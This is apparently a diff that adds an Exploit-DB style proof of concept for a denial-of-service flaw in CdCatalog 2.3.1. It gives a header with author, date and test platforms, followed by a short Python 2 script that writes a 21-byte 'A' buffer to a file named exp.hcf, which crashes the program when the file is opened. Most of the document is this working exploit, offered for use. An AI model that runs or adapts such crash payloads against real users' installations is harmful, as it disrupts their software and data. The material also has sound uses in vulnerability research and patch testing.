@@ -1,0 +1,28 @@
+# Exploit Title: CdCatalog 2.3.1 - Denial of Service (PoC)
+# Dork: N/A
+# Date: 2018-11-01
+# Exploit Author: Ihsan Sencan
+# Vendor Homepage: http://cdcat.sourceforge.net
+# Software Link: https://netcologne.dl.sourceforge.net/project/cdcat/cdcat/cdcat-2.3.1/cdcat-2.3.1.tar.bz2
+# Version: 2.3.1
+# Category: Dos
+# Tested on: WiN7_x64/KaLiLinuX_x64
+# CVE: N/A
+
+# POC: 
+# 1)
+# CTRL+O & File/Open/exp.hcf
+
+#!/usr/bin/python
+    
+buffer = "A" * 21
+ 
+payload = buffer
+try:
+    f=open("exp.hcf","w")
+    print "[+] Creating %s bytes evil payload." %len(payload)
+    f.write(payload)
+    f.close()
+    print "[+] File created!"
+except:
+    print "File cannot be created."
